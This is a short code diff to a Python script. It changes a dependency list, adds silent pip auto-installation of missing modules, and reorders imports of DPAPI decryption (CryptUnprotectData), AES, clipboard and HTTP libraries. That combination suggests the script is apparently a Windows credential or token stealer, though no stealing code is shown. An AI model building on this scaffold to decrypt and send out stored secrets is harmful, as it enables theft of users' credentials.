@@ -34,7 +34,7 @@ requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome"],
     ["win32clipboard", "pywin32"],
-    ["pypiwin32","pypiwin32"]
+    ["win32crypt", "pypiwin32"],
 ]
 
 for modl in requirements:
@@ -42,12 +42,12 @@ for modl in requirements:
         __import__(modl[0])
     except ImportError:
         subprocess.call(['pip', 'install', modl[1]])
-        
+
 from win32crypt import CryptUnprotectData
-import requests
-from ctypes import *
 from Crypto.Cipher import AES
 import win32clipboard
+import requests
+from ctypes import *
 
 
 def clear_command_prompt():
